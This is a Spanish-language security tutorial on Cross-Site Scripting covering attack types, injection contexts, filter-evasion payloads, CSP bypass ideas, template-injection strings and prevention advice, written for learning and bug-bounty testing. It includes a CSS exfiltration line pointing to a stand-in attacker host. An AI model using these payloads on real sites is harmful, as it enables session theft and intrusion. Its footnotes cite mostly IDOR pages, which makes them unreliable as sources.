# XSS (Cross-Site Scripting) 

## Resumen

El Cross-Site Scripting (XSS) es una de las vulnerabilidades más críticas y prevalentes en aplicaciones web, permitiendo a un atacante inyectar scripts maliciosos que se ejecutan en el navegador de otros usuarios bajo el contexto del sitio vulnerable, comprometiendo confidencialidad, integridad y control de la sesión. XSS transforma el navegador de la víctima en herramienta de ataque, con impactos que van mucho más allá de un simple `alert()`.[^3]

## ¿Qué es XSS?

XSS permite la inyección y ejecución de scripts (principalmente JavaScript, aunque puede incluir HTML, CSS o instrucciones DOM) en navegadores de terceros. Es peligroso porque el script ejecuta con los privilegios del usuario víctima en la sesión actual. XSS puede derivar en robo de sesión, keylogging, phishing, defacement, redirecciones maliciosas, acciones no autorizadas (CSRF) y pivot a la red interna.[^1]

## Impacto Real del XSS

- **Robo de sesión** (cookies/LocalStorage)
- **Keylogging** y robo de credenciales
- **Phishing** y manipulación visual
- **Defacement** de la página
- **Redirección a sitios maliciosos**
- **Ejecución de acciones con sesión legítima**
- **Bypass de CSRF por extracción de tokens**
- **Escaneo de red interna usando el navegador de la víctima**

## Tipos de XSS

### 1. Reflejado (Reflected XSS)

El payload se envía en la URL o parámetro y se refleja directamente en la respuesta.

- Requiere que la víctima interactúe con un enlace (phishing, email, red social).
- No persiste, el impacto es inmediato y transitorio.
- Ejemplo básico:

```
https://victima.com/?q=<script>alert(1)</script>
```

### 2. Almacenado (Stored XSS)

El payload malicioso es guardado en la base de datos, log, archivo o campo de usuario y se ejecuta cada vez que otro usuario visualiza la página.

- Impacto masivo — cualquier usuario que visite la vista afectada es vulnerable.
- Superficies típicas: comentarios, nombre de usuario, logs, uploads, metadatos.

### 3. DOM-based XSS

El payload nunca pasa por el servidor — el código JavaScript vulnerable procesa directamente datos no confiables desde el DOM (hash, search, referrer, nombre ventana, storage).

- Difícil de detectar vía logs o WAF.
- Ejemplo:

```javascript
// Vulnerable:
var term = location.hash.substring(1);
document.getElementById('out').innerHTML = term;
```

Payload: `#<img src=x onerror=alert(1)>`

### 4. Blind XSS

El atacante inyecta payloads esperando que sean ejecutados en otra parte de la app (panel admin, logs).

- Requiere uso de colaborador (Burp Collaborator, Interactsh, XSS Hunter).
- Detectado vía callbacks, no necesariamente desde la vista atacante.

## Contextos y Técnicas de Inyección

**1. En HTML:**

```html
<div>INJECTION_AQUÍ</div>
<!-- Payload: --><script>alert(1)</script>
<a href="INJ">link</a>
<!-- Payload: -->javascript:alert(1)
```

**2. En atributos:**

```html
<input type="text" value="INJ">
<!-- Payload: "><script>alert(1)</script> -->
<!-- o " onmouseover="alert(1) -->
```

**3. En JavaScript inline:**

```javascript
var username = 'INJ';
// ';alert(1);var q='
var id = INJ;
// 1;alert(1)
```

**4. En CSS:**

```css
input[value^="a"] { background:url('http://atacante.com/log?val=a'); }
```

**5. Polyglots y tags alternativos:**

```html
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
<details open ontoggle=alert(1)>
```

## Evasión Avanzada y Filtrado

- Mayúsculas/minúsculas arbitrarias: `<ScRiPt>alert(1)</sCrIpT>`
- Codificación: `%3Cscript%3Ealert(1)%3C/script%3E`
- HTML entities: `&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;`
- JavaScript obfuscado: `eval(atob('YWxlcnQoMSk='))`
- Tags alternativos (`<marquee onstart=...>`)
- mutation XSS: aprovechar cómo el navegador remonta HTML malformado.

## Mutation XSS (mXSS)

El navegador corrige HTML malformado de forma no anticipada por los sanitizadores, ejecutando código que parecía inofensivo.
Ejemplo:

```html
<INVALID><svg><g/onload=alert(1)>
```

## XSS y Content Security Policy (CSP)

La **CSP** ayuda a mitigar XSS restringiendo el origen de scripts.

- Ejemplo:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com; object-src 'none';
```

- Bypass conocidos: endpoints JSONP, subida de archivos, base/URI injection, data URIs.

## XSS en Frameworks Modernos

- **React:** Escapa por defecto. Riesgo solo con `dangerouslySetInnerHTML`.
- **Angular:** Escapa y sanitiza. Riesgo con `bypassSecurityTrustHtml`.
- **Vue:** Escapa siempre salvo uso directo de `v-html`.

## Client-side Template Injection (CSTI)

Muchos frameworks soportan templates del lado cliente (Angular, Vue, Handlebars).

- Ejemplo Angular 1.x:
  `{{constructor.constructor('alert(1)')()}}`
- Vue:
  `{{_createElementBlock.constructor("alert(1)")()}}`

## Detección y Testing

**1. Manual**

- Buscar puntos “reflejados” o reflejados en el DOM.
- Injectar tags y observar ejecución, errores o diferencias en el DOM.
- Revisar eventos reparados (onerror, onmouseout, etc).

**2. Automatizado**

- Burp Suite DOM Invader, ZAP Active Scan, XSS Hunter, Interactsh.

**3. Code review y SAST**

- ESLint + plugins, búsqueda de sinks peligrosos (`innerHTML`, `eval`, `document.write`).

## Prevención

1. **Codificación contextual**
   - HTML: escapado de `<, >, &, ", '`
   - JS: escapado según contexto string, template, numérico.
   - URL: encodeURIComponent().
2. **Validación estricta de input** (whitelist, nunca blacklist).
3. **Sanitización HTML**: DOMPurify, Bleach, HTMLPurifier.
4. **CSP robusta**: `'self'`, nonces dinámicos, bloquear `unsafe-inline` salvo JS crítico.
5. **Headers de seguridad**:

```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
```

6. **Cookies seguras**:
   `Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict`
7. **Frameworks seguros**: React, Vue, Angular — evitar bypass de sus protecciones.

## Mejores Prácticas y Checklist Bug Bounty

- Fuzz en input reflectados y dom sinks.
- Probar inputs con codificaciones mixtas, payloads mXSS, CSP bypasses.
- Buscar áreas a menudo olvidadas: páginas de error, logs de admin, previews, zonas internas.
- Unificar técnicas de XSS y otros vectores (CSRF, Open Redirect, LFI).

## Reporte

**Título:** Cross-Site Scripting (XSS) – Ejecución de Script No Autorizada
**Resumen Ejecutivo:** El endpoint refleja/parsea input controlado por el usuario sin escapado contextual, permitiendo ejecución arbitraria de JavaScript/XSS y ataques a usuarios autenticados.
**Pasos de Reproducción:**

1. Inyectar payload `<script>alert(1)</script>`, o variante para contexto.
2. Observar ejecución automática o callback.
3. Demostrar robo de cookie/session, defacement o acción no autorizada.
   **Mitigación Recomendada:** Escapado contextual, validación/sanitización, CSP restrictiva y testing continuo.



[^1]: https://portswigger.net/web-security/access-control/idor
    
[^2]: https://www.webasha.com/blog/what-is-an-example-of-a-real-bug-bounty-report-where-idor-was-used-to-exploit-a-banking-application
    
[^3]: https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
    
[^4]: https://infosecwriteups.com/️-hunting-idor-a-deep-dive-into-insecure-direct-object-references-b550a9f77333
    
[^5]: https://www.legitsecurity.com/aspm-knowledge-base/insecure-direct-object-references/
    
[^6]: https://bigid.com/blog/idor-vulnerability/
    
[^7]: https://virtualcyberlabs.com/insecure-direct-object-references-idor/
    
[^8]: https://authenticone.com/idor-the-silent-gateway-to-data-breaches/
    
[^9]: https://www.clouddefense.ai/cwe/definitions/639
    
[^10]: https://infosecwriteups.com/automate-xss-idor-bug-hunting-using-bash-python-a-hackers-toolkit-e8453e51f703
    
[^11]: https://github.com/S12cybersecurity/Idor-Hunter
    
[^12]: https://academy.hackthebox.com/course/preview/attacking-graphql
